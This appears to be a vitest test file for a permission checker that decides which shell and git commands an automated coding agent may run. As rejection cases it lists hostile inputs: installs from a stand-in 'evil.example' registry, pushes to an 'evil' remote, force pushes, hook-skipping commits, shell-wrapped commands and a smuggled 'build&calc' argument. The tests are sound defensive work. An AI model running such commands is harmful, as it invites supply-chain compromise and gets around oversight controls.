import { describe, expect, it } from "vitest";
import { envelopeCovers, normalizePermissions, RUN_PERMISSIONS, type EnvelopeRequest, type RunPermission } from "../../src/plans/run-envelope.js";

const ALL: RunPermission[] = [...RUN_PERMISSIONS];

function shell(command: string, args: string[], overrides: Partial<EnvelopeRequest> = {}): EnvelopeRequest {
  return {
    toolName: "shell_run",
    category: "command",
    tier: "write",
    input: { command, args },
    description: `Run \`${[command, ...args].join(" ")}\``,
    ...overrides,
  };
}

function covered(request: EnvelopeRequest, allow: RunPermission[] = ALL, runBranch?: string): string | false {
  const match = envelopeCovers(request, { allow, runBranch });
  return match.covered ? match.permission : false;
}

describe("envelopeCovers — install_dependencies", () => {
  it("covers installs from the project's own manifest", () => {
    expect(covered(shell("npm", ["ci"], { tier: "network" }))).toBe("install_dependencies");
    expect(covered(shell("npm", ["install"], { tier: "network" }))).toBe("install_dependencies");
    expect(covered(shell("pnpm", ["install", "--frozen-lockfile"], { tier: "network" }))).toBe("install_dependencies");
    expect(covered(shell("yarn", [], { tier: "network" }))).toBe("install_dependencies");
    expect(covered(shell("uv", ["sync", "--locked"], { tier: "network" }))).toBe("install_dependencies");
    expect(covered(shell("pip", ["install", "-r", "requirements.txt"], { tier: "network" }))).toBe("install_dependencies");
    expect(covered(shell("python", ["-m", "pip", "install", "-e", "."], { tier: "network" }))).toBe("install_dependencies");
    expect(covered(shell("npm.cmd", ["ci"], { tier: "network" }))).toBe("install_dependencies");
  });

  it("never covers adding a package by name, a global install or a registry override", () => {
    expect(covered(shell("npm", ["install", "left-pad"], { tier: "network" }))).toBe(false);
    expect(covered(shell("npm", ["install", "-g", "typescript"], { tier: "network" }))).toBe(false);
    expect(covered(shell("npm", ["install", "--registry=https://evil.example"], { tier: "network" }))).toBe(false);
    expect(covered(shell("pip", ["install", "requests"], { tier: "network" }))).toBe(false);
    expect(covered(shell("pip", ["install", "-r", "../other/requirements.txt"], { tier: "network" }))).toBe(false);
    expect(covered(shell("pip", ["install", "-r", "https://evil.example/r.txt"], { tier: "network" }))).toBe(false);
    expect(covered(shell("pip", ["install", "--index-url", "https://evil.example", "-r", "requirements.txt"], { tier: "network" }))).toBe(false);
    expect(covered(shell("yarn", ["add", "lodash"], { tier: "network" }))).toBe(false);
    expect(covered(shell("npx", ["something"], { tier: "network" }))).toBe(false);
  });

  it("needs the permission to have been given", () => {
    expect(covered(shell("npm", ["ci"], { tier: "network" }), ["project_scripts"])).toBe(false);
    expect(covered(shell("npm", ["ci"], { tier: "network" }), [])).toBe(false);
  });
});

describe("envelopeCovers — project_scripts", () => {
  it("covers test, build and lint scripts and the standard toolchain commands", () => {
    expect(covered(shell("npm", ["test"]))).toBe("project_scripts");
    expect(covered(shell("npm", ["run", "build"]))).toBe("project_scripts");
    expect(covered(shell("npm", ["run", "test:unit", "--", "--run"]))).toBe("project_scripts");
    expect(covered(shell("pnpm", ["lint"]))).toBe("project_scripts");
    expect(covered(shell("cargo", ["test"]))).toBe("project_scripts");
    expect(covered(shell("go", ["test", "./..."]))).toBe("project_scripts");
    expect(covered(shell("python", ["-m", "pytest", "tests"]))).toBe("project_scripts");
    expect(covered(shell("vitest", ["run"]))).toBe("project_scripts");
  });

  it("does not cover other scripts or arbitrary make targets", () => {
    expect(covered(shell("npm", ["run", "deploy"]))).toBe(false);
    expect(covered(shell("npm", ["run", "release"]))).toBe(false);
    expect(covered(shell("npm", ["publish"]))).toBe(false);
    expect(covered(shell("make", ["install"]))).toBe(false);
    expect(covered(shell("cargo", ["publish"]))).toBe(false);
  });
});

describe("envelopeCovers — git", () => {
  it("covers staging and a plain commit", () => {
    expect(covered(shell("git", ["add", "-A"]))).toBe("git_commit");
    expect(covered(shell("git", ["add", "src/a.ts"]))).toBe("git_commit");
    expect(covered(shell("git", ["commit", "-m", "Step 3: wire the parser"]))).toBe("git_commit");
  });

  it("does not cover amend, skipped hooks or config overrides", () => {
    expect(covered(shell("git", ["commit", "--amend", "-m", "x"]))).toBe(false);
    expect(covered(shell("git", ["commit", "--no-verify", "-m", "x"]))).toBe(false);
    expect(covered(shell("git", ["-c", "core.hooksPath=/tmp", "commit", "-m", "x"]))).toBe(false);
  });

  it("covers a push of the run's own branch to origin, and nothing else", () => {
    const branch = "blacksite/run-ship-it-a1b2";
    const push = (args: string[]): EnvelopeRequest => shell("git", args, { tier: "network" });
    expect(covered(push(["push", "-u", "origin", branch]), ALL, branch)).toBe("push_run_branch");
    expect(covered(push(["push", "origin", "main"]), ALL, branch)).toBe(false);
    expect(covered(push(["push", "evil", branch]), ALL, branch)).toBe(false);
    expect(covered(push(["push", "--force", "origin", branch]), ALL, branch)).toBe(false);
    expect(covered(push(["push", "origin", `${branch}:main`]), ALL, branch)).toBe(false);
    // Without an isolated copy there is no run branch to push.
    expect(covered(push(["push", "origin", branch]), ALL, undefined)).toBe(false);
  });

  it("covers the structured git_op push the same way", () => {
    const branch = "blacksite/run-x-0001";
    const op = (input: Record<string, unknown>): EnvelopeRequest => ({ toolName: "git_op", category: "command", tier: "network", input, description: "git push" });
    expect(covered(op({ op: "push", branch, setUpstream: true }), ALL, branch)).toBe("push_run_branch");
    expect(covered(op({ op: "push", branch, force: true }), ALL, branch)).toBe(false);
    expect(covered(op({ op: "push", branch: "main" }), ALL, branch)).toBe(false);
    expect(covered(op({ op: "push", branch, remote: "upstream" }), ALL, branch)).toBe(false);
  });
});

describe("envelopeCovers — the floor", () => {
  it("never covers destructive, unrecognized, outside-the-workspace or shell-wrapped commands", () => {
    expect(covered(shell("npm", ["ci"], { tier: "destructive" }))).toBe(false);
    expect(covered(shell("npm", ["test"], { unrecognizedCommand: true }))).toBe(false);
    expect(covered(shell("npm", ["test"], { description: "Run `npm test` — reaches outside the workspace: C:/secrets" }))).toBe(false);
    expect(covered(shell("bash", ["-lc", "npm test"]))).toBe(false);
    expect(covered(shell("cmd", ["/c", "npm test"]))).toBe(false);
    expect(covered(shell("python", ["-c", "import os"]))).toBe(false);
    expect(covered(shell("npm", ["run", "build&calc"]))).toBe(false);
    expect(covered(shell("./node_modules/.bin/vitest", ["run"]))).toBe(false);
  });

  it("never covers anything outside commands", () => {
    for (const category of ["edit", "service", "sequence", "mcp"] as const) {
      expect(covered({ ...shell("npm", ["test"]), category })).toBe(false);
    }
  });

  it("keeps only known permissions from input", () => {
    expect(normalizePermissions(["git_commit", "rm_rf", 3, "project_scripts"])).toEqual(["project_scripts", "git_commit"]);
    expect(normalizePermissions("all")).toEqual([]);
  });
});
